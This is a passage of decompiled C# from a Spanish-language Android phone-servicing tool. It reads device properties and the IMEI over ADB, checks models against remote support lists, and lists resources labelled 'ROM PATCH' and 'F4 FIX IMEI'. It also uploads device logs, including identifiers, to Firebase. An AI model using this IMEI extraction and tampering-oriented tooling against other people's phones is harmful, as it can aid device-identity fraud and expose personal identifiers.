				WebClient webClient = new WebClient();
				string address = "https://reparacionesdecelular.com/up/mtmodels.ts";
				string text = webClient.DownloadString(address);
				string[] array = text.Split(new string[]
				{
					Environment.NewLine
				}, StringSplitOptions.None);
				bool flag = false;
				string arg = "";
				foreach (string text2 in array)
				{
					bool flag2 = text2.StartsWith("Soportado");
					if (flag2)
					{
						flag = (text2.Contains(string.Format("{{{0}}}", codename)) && text2.Contains(string.Format("[{0}]", carrierid)));
						Match match = Regex.Match(text2, "\\[(XT\\d{4}-\\d(?:-\\d)?)\\]");
						bool success = match.Success;
						if (success)
						{
							arg = match.Groups[1].Value;
						}
						else
						{
							arg = "";
						}
					}
					else
					{
						bool flag3 = flag;
						if (flag3)
						{
							bool flag4 = string.IsNullOrWhiteSpace(text2);
							if (flag4)
							{
								flag = false;
							}
							else
							{
								bool flag5 = text2.StartsWith("https");
								if (flag5)
								{
									string[] array3 = text2.Split(new char[]
									{
										'|'
									}, 2);
									string text3 = array3[0].Trim();
									string text4 = (array3.Length > 1) ? array3[1].Trim().ToUpper() : "";
									bool flag6 = text3.Contains("drive.google.com");
									if (flag6)
									{
										string arg2;
										if (Operators.CompareString(text4, "ROM PATCH", false) != 0)
										{
											if (Operators.CompareString(text4, "PROCESO METODO PDF", false) != 0)
											{
												if (Operators.CompareString(text4, "ISP DRILL DUMPS", false) != 0)
												{
													if (Operators.CompareString(text4, "F4 FIX IMEI", false) != 0)
													{
														arg2 = "\ud83d\udd17";
													}
													else
													{
														arg2 = "\ud83d\udd10";
													}
												}
												else
												{
													arg2 = "\ud83d\udcbe";
												}
											}
											else
											{
												arg2 = "\ud83d\udcc4";
											}
										}
										else
										{
											arg2 = "\ud83d\udcf2";
										}
										string text5 = string.Format("{0} {1} {2}", arg2, text4, arg).Trim();
										ListViewItem listViewItem = new ListViewItem(text5);
										listViewItem.SubItems.Add(text3);
										listViewItem.ForeColor = Color.RoyalBlue;
									}
									else
									{
										string text5 = Path.GetFileName(text3);
										ListViewItem listViewItem2 = new ListViewItem(text5);
										listViewItem2.SubItems.Add(text3);
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("Error al verificar el soporte del dispositivo: {0}", ex.Message) + Environment.NewLine);
			}
			return result;
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000065E0 File Offset: 0x000047E0
		private void SetAllButtonsEnabled(bool enabled, Control except = null)
		{
			this.HabilitarBotonesEnControles(base.Controls, enabled, except);
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000065F4 File Offset: 0x000047F4
		private void HabilitarBotonesEnControles(Control.ControlCollection controls, bool enabled, Control except)
		{
			try
			{
				foreach (object obj in controls)
				{
					Control control = (Control)obj;
					bool flag = control is Button;
					if (flag)
					{
						control.Enabled = enabled;
					}
					bool hasChildren = control.HasChildren;
					if (hasChildren)
					{
						this.HabilitarBotonesEnControles(control.Controls, enabled, except);
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00006680 File Offset: 0x00004880
		private string EstaSoportado(string model, string carrierid)
		{
			try
			{
				WebClient webClient = new WebClient();
				string address = "https://reparacionesdecelular.com/up/smmodels.ts";
				string text = webClient.DownloadString(address);
				string[] array = text.Split(new string[]
				{
					Environment.NewLine
				}, StringSplitOptions.RemoveEmptyEntries);
				model = model.Trim().ToUpperInvariant();
				carrierid = carrierid.Trim().ToUpperInvariant();
				foreach (string text2 in array)
				{
					string[] array3 = text2.Split(new char[]
					{
						'*'
					});
					bool flag = array3.Length >= 1;
					if (flag)
					{
						string text3 = array3[0].Trim();
						string result = (array3.Length > 1) ? array3[1].Trim() : "";
						string[] array4 = text3.Split(new char[]
						{
							'|'
						});
						bool flag2 = array4.Length == 2;
						if (flag2)
						{
							string right = array4[0].Trim().ToUpperInvariant();
							string right2 = array4[1].Trim().ToUpperInvariant();
							bool flag3 = Operators.CompareString(model, right, false) == 0 && Operators.CompareString(carrierid, right2, false) == 0;
							if (flag3)
							{
								return result;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("Error al verificar soporte: {0}", ex.Message) + Environment.NewLine);
			}
			return "";
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00006814 File Offset: 0x00004A14
		private void InitializeFastbootTimer()
		{
			this.fastbootTimer = new System.Timers.Timer(5000.0);
			this.fastbootTimer.AutoReset = true;
			this.fastbootTimer.Enabled = true;
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00006845 File Offset: 0x00004A45
		private void InitializeControls()
		{
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00006848 File Offset: 0x00004A48
		private void GuardarLogDesdeTxtOutput()
		{
			try
			{
				bool flag = this.cmbDevices.Items.Count == 0;
				if (flag)
				{
					MessageBox.Show("No hay dispositivos listados en cmbDevices.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					object selectedItem = this.cmbDevices.SelectedItem;
					string text = ((selectedItem != null) ? selectedItem.ToString() : null) ?? string.Empty;
					bool flag2 = string.IsNullOrEmpty(text);
					if (flag2)
					{
						MessageBox.Show("No se ha seleccionado un dispositivo en cmbDevices. Selecciona un dispositivo para guardar el log.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						this.cmbDevices.Focus();
					}
					else
					{
						string text2 = this.txtOutput.Text.Trim();
						bool flag3 = string.IsNullOrEmpty(text2);
						if (flag3)
						{
							MessageBox.Show("El contenido de txtOutput está vacío. No se guardará el log.", "Advertencia", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						}
						else
						{
							Match match = Regex.Match(text2, "Model:\\s*(\\S+)");
							string input = match.Success ? match.Groups[1].Value : "Desconocido";
							string text3 = Regex.Replace(input, "[^a-zA-Z0-9_-]", "");
							string arg = Regex.Replace(text, "[^a-zA-Z0-9_-]", "_");
							string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
							string text4 = Path.Combine(path, text3);
							bool flag4 = !Directory.Exists(text4);
							if (flag4)
							{
								Directory.CreateDirectory(text4);
							}
							string path2 = string.Format("{0}_{1}_{2:yyyyMMdd_HHmmss}_Logs.txt", text3, arg, DateTime.Now);
							string path3 = Path.Combine(text4, path2);
							File.WriteAllText(path3, text2);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al guardar el log: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00006A1C File Offset: 0x00004C1C
		public void LeerInformacionAdb(string selectedDevice)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(selectedDevice) && Operators.CompareString(selectedDevice, "waiting for devices...", false) != 0;
				if (flag)
				{
					string arg = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", selectedDevice);
					string arg2 = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", selectedDevice);
					string text = this.ExecuteAdbCommand("shell getprop ro.product.brand", selectedDevice);
					string text2 = this.ExecuteAdbCommand("shell getprop ro.product.model", selectedDevice);
					string arg3 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", selectedDevice);
					string arg4 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", selectedDevice);
					string arg5 = this.ExecuteAdbCommand("shell getprop ro.boot.bootloader", selectedDevice);
					string text3 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", selectedDevice);
					string arg6 = this.ExecuteAdbCommand("shell getprop ro.hardware", selectedDevice);
					string text4 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", selectedDevice);
					string arg7 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", selectedDevice);
					string arg8 = this.ExecuteAdbCommand("shell getprop ro.boot.rp", selectedDevice);
					string text5 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", selectedDevice);
					string text6 = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 | grep -o '[0-9a-f]\\{8\\} ' | tail -n+3 | while read a; do echo -n \\\\u${a:4:4}\\\\u${a:0:4}; done", selectedDevice);
					string arg9 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", selectedDevice);
					this.txtOutput.Clear();
					this.ActualizarProgreso();
					this.txtOutput.AppendText(string.Format("- Connecting ... {0}", arg2) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Marca: {0}", arg) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("model: {0}", text2) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("SN: {0}", arg2) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Android: {0}", arg4) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Security: {0}", arg3) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Baseband: {0}", arg5) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("SIM: {0}", arg7) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Hardware: {0}", arg6) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("carrierid: {0}", text5) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("Binario: {0}", arg8) + Environment.NewLine);
					this.txtOutput.AppendText(string.Format("carrier: {0}", arg9) + Environment.NewLine);
					this.ActualizarProgreso();
					this.GuardarEnArchivo(text2, this.txtOutput.Text);
					this.TextBox1.Text = "Log guardado en: \\Logs\\" + text2;
					this.ActualizarProgreso();
					string text7 = this.EstaSoportado(text2, text5);
					bool flag2 = !string.IsNullOrEmpty(text7);
					if (flag2)
					{
						this.txtOutput.AppendText(Environment.NewLine + "✅ Este dispositivo está soportado." + Environment.NewLine);
						this.txtOutput.AppendText("ℹ️ " + text7 + Environment.NewLine);
					}
					else
					{
						this.txtOutput.AppendText(Environment.NewLine + "❌ Este dispositivo NO está soportado." + Environment.NewLine);
					}
					this.ActualizarProgreso();
				}
				else
				{
					MessageBox.Show("Por favor selecciona un dispositivo ADB.");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al leer desde el dispositivo ADB: " + ex.Message);
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00006DD8 File Offset: 0x00004FD8
		private async Task EjecutarLecturaAdbAsync()
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CancellationToken token = cts.Token;
				Task tareaProceso = Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							this.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							string selectedDevice = "";
							this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag5 = this.cmbDevicesAdb.SelectedItem != null;
								if (flag5)
								{
									selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(selectedDevice);
							if (flag3)
							{
								this.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = this.cancelRequested || token.IsCancellationRequested;
								if (flag4)
								{
									this.LogOutput("⏹ Proceso cancelado antes de iniciar la lectura.");
								}
								else
								{
									this.LogOutput(string.Format("\ud83d\udd0d Leyendo información de: {0}", selectedDevice));
									this.txtOutput.Clear();
									string text = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", selectedDevice).ToLower().Trim();
									uint num = <PrivateImplementationDetails>.ComputeStringHash(text);
									if (num <= 1554908468U)
									{
										if (num != 272549840U)
										{
											if (num != 746161167U)
											{
												if (num == 1554908468U)
												{
													if (Operators.CompareString(text, "xiaomi", false) == 0)
													{
														this.LeerXiaomi(selectedDevice);
														goto IL_2D5;
													}
												}
											}
											else if (Operators.CompareString(text, "honor", false) == 0)
											{
												this.LeerHonor(selectedDevice);
												goto IL_2D5;
											}
										}
										else if (Operators.CompareString(text, "motorola", false) == 0)
										{
											this.LeerMotorola(selectedDevice);
											goto IL_2D5;
										}
									}
									else if (num <= 2743415571U)
									{
										if (num != 2621529407U)
										{
											if (num == 2743415571U)
											{
												if (Operators.CompareString(text, "oneplus", false) == 0)
												{
													this.LeerOnePlus(selectedDevice);
													goto IL_2D5;
												}
											}
										}
										else if (Operators.CompareString(text, "samsung", false) == 0)
										{
											this.LeerSamsung(selectedDevice);
											goto IL_2D5;
										}
									}
									else if (num != 3285168183U)
									{
										if (num == 3422476192U)
										{
											if (Operators.CompareString(text, "huawei", false) == 0)
											{
												this.LeerHuawei(selectedDevice);
												goto IL_2D5;
											}
										}
									}
									else if (Operators.CompareString(text, "vivo", false) == 0)
									{
										this.LeerOnePlus(selectedDevice);
										goto IL_2D5;
									}
									this.LeerGenerico(selectedDevice, text);
									IL_2D5:
									this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										this.UpdateProgressBar();
									}));
								}
							}
						}
					}
					catch (Exception ex2)
					{
						this.LogOutput(string.Format("❗ Error durante el proceso: {0}", ex2.Message));
					}
				}, token);
				Task tareaTimeout = Task.Delay(7000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				try
				{
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error de limpieza: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.AplicarPermisosDesdeFirebasePorPlan();
					}));
				}
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006E1C File Offset: 0x0000501C
		private async void btnReadAdbAll_Click(object sender, EventArgs e)
		{
			Form1._Closure$__104-0 CS$<>8__locals1 = new Form1._Closure$__104-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
			bool flag = CS$<>8__locals1.$VB$Local_devices.Count == 0;
			if (flag)
			{
				MessageBox.Show("No se detectó ningún dispositivo ADB.");
			}
			else
			{
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Clear();
					try
					{
						foreach (string item in CS$<>8__locals1.$VB$Local_devices)
						{
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Add(item);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedIndex = 0;
				}));
				CS$<>8__locals1.$VB$Local_selectedDevice = "";
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
				}));
				await this.EjecutarReadAdbAll(CS$<>8__locals1.$VB$Local_selectedDevice);
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00006E64 File Offset: 0x00005064
		private async Task EjecutarReadAdbAll(string selectedDevice)
		{
			bool flag = this.processRunning;
			if (!flag)
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
				}));
				DateTime inicio = DateTime.Now;
				try
				{
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.UpdateProgressBar();
					}));
					this.txtOutput.Clear();
					this.txtOutput.AppendText("Operation : Read Info Adb" + Environment.NewLine);
					await Task.Run(delegate()
					{
						this.LeerInformacionAdbPorMarca(selectedDevice);
					});
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.UpdateProgressBar();
					}));
					this.txtOutput.AppendText(Environment.NewLine);
					this.txtOutput.AppendText("✅ Process : Read Info Adb - completado." + Environment.NewLine);
					TimeSpan duracion = DateTime.Now.Subtract(inicio);
					this.txtOutput.AppendText(string.Format("⏱ Duración total: {0}h {1}m {2}s", duracion.Hours, duracion.Minutes, duracion.Seconds) + Environment.NewLine);
					this.GuardarLog(selectedDevice, "Read Info Adb", this.txtOutput);
					string textoPlano = this.txtOutput.Text;
					await this.GuardarLogEnFirebase(textoPlano);
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.UpdateProgressBar();
					}));
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00006EB0 File Offset: 0x000050B0
		public void LeerInformacionAdbPorMarca(string selectedDevice)
		{
			this.VerificarEntornoSeguro();
			try
			{
				string text = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", selectedDevice).ToLower().Trim();
				uint num = <PrivateImplementationDetails>.ComputeStringHash(text);
				if (num <= 1554908468U)
				{
					if (num != 272549840U)
					{
						if (num != 746161167U)
						{
							if (num == 1554908468U)
							{
								if (Operators.CompareString(text, "xiaomi", false) == 0)
								{
									this.LeerXiaomi(selectedDevice);
									goto IL_15C;
								}
							}
						}
						else if (Operators.CompareString(text, "honor", false) == 0)
						{
							this.LeerHonor(selectedDevice);
							goto IL_15C;
						}
					}
					else if (Operators.CompareString(text, "motorola", false) == 0)
					{
						this.LeerMotorola(selectedDevice);
						goto IL_15C;
					}
				}
				else if (num <= 2743415571U)
				{
					if (num != 2621529407U)
					{
						if (num == 2743415571U)
						{
							if (Operators.CompareString(text, "oneplus", false) == 0)
							{
								this.LeerOnePlus(selectedDevice);
								goto IL_15C;
							}
						}
					}
					else if (Operators.CompareString(text, "samsung", false) == 0)
					{
						this.LeerSamsung(selectedDevice);
						goto IL_15C;
					}
				}
				else if (num != 3285168183U)
				{
					if (num == 3422476192U)
					{
						if (Operators.CompareString(text, "huawei", false) == 0)
						{
							this.LeerHuawei(selectedDevice);
							goto IL_15C;
						}
					}
				}
				else if (Operators.CompareString(text, "vivo", false) == 0)
				{
					this.LeerVivo(selectedDevice);
					goto IL_15C;
				}
				this.LeerGenerico(selectedDevice, text);
				IL_15C:;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al leer información de marca: " + ex.Message);
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00007060 File Offset: 0x00005260
		private void LeerGenerico(string device, string manufacturer)
		{
			this.txtOutput.Clear();
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.publicname", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string text2 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop ro.hardware", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.carrier", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
			string text3 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg12 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText(string.Format("\ud83d\udcf1 Dispositivo genérico ({0})", manufacturer) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("- Connecting ... {0}", arg) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Marca: {0}", manufacturer) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg2));
			this.txtOutput.AppendText(string.Format("Model : {0}", text));
			this.txtOutput.AppendText(string.Format("SN: {0}", arg));
			this.txtOutput.AppendText(string.Format("Android: {0}", arg3));
			this.txtOutput.AppendText(string.Format("Security: {0}", arg4));
			this.txtOutput.AppendText(string.Format("Hardware: {0}", arg6));
			this.txtOutput.AppendText(string.Format("Carrier ID: {0}", arg8));
			this.txtOutput.AppendText(string.Format("Compilacion: {0}", arg9));
			this.txtOutput.AppendText(string.Format("SIM: {0}", arg7));
			this.txtOutput.AppendText(string.Format("Baseband: {0}", arg5));
			this.txtOutput.AppendText(string.Format("Procoesador: {0}", arg10));
			this.txtOutput.AppendText(string.Format("Modelo Procesador: {0}", arg11));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg12));
			this.GuardarEnArchivo(text, this.txtOutput.Text);
			this.TextBox1.Text = "Log guardado en: \\Logs\\" + text;
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00007314 File Offset: 0x00005514
		private void LeerMotorola(string device)
		{
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.boot.hardware.sku", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop ro.carrier", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop ro.product.device", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop gsm.operator.iso-country", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.hardware", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string text2 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string text3 = this.ExecuteAdbCommand("shell getprop ro.boot.rp", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg16 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText("\ud83d\udcf1 Motorola Device" + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("SN: {0}", arg));
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("Model: {0}", arg3));
			this.txtOutput.AppendText(string.Format("ModelName: {0}", arg4));
			this.txtOutput.AppendText(string.Format("Carrier ID: {0}", arg5));
			this.txtOutput.AppendText(string.Format("Codename: {0}", arg6));
			this.txtOutput.AppendText(string.Format("Android: {0}", arg8));
			this.txtOutput.AppendText(string.Format("Security: {0}", arg9));
			this.txtOutput.AppendText(string.Format("Region : {0}", arg10));
			this.txtOutput.AppendText(string.Format("Firmware: {0}", arg11));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg13));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg12));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg14));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg15));
			this.txtOutput.AppendText(string.Format("Baseband: {0}", arg7));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg16));
		}

		// Token: 0x06000096 RID: 150 RVA: 0x000075E4 File Offset: 0x000057E4
		private void LeerSamsung(string device)
		{
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.build.product", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop gsm.operator.iso-country", device);
			string text2 = this.ExecuteAdbCommand("shell getprop ro.boot.bootloader", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.PDA", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop ro.vendor.build.version.incremental", device);
			string text3 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.boot.carrierid", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.build.display.id", device);
			string text4 = this.ExecuteAdbCommand("shell getprop knox.kg.state", device);
			string text5 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg16 = this.ExecuteAdbCommand("shell getprop ro.bootloader", device);
			string arg17 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg18 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string arg19 = this.ExecuteAdbCommand("shell getprop ro.boot.rp", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg20 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText("\ud83d\udcf1 Samsung Device" + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("SN : {0}", arg));
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("Model : {0}", arg4));
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg3));
			this.txtOutput.AppendText(string.Format("Version : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Region : {0}", arg7));
			this.txtOutput.AppendText(string.Format("Android : {0}", arg5));
			this.txtOutput.AppendText(string.Format("Security : {0}", arg6));
			this.txtOutput.AppendText(string.Format("Bit : {0}", arg19));
			this.txtOutput.AppendText(string.Format("BL : {0}", arg16));
			this.txtOutput.AppendText(string.Format("AP : {0}", arg9));
			this.txtOutput.AppendText(string.Format("CP : {0}", arg8));
			this.txtOutput.AppendText(string.Format("CSC : {0}", arg10));
			this.txtOutput.AppendText(string.Format("CarrierId : {0}", arg11));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg13));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg14));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg15));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg17));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg18));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg20));
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00007950 File Offset: 0x00005B50
		private void LeerXiaomi(string device)
		{
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.product.marketname", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop ro.build.version.incremental", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop ro.boot.hwc", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.secureboot.lockstate", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.hardware", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.build.fingerprint", device);
			string arg16 = this.ExecuteAdbCommand("shell getprop ro.ril.miui.imei0", device);
			this.txtOutput.AppendText(string.Format("SN : {0}", arg) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg3));
			this.txtOutput.AppendText(string.Format("Model : {0}", arg4));
			this.txtOutput.AppendText(string.Format("Version : {0}", arg5));
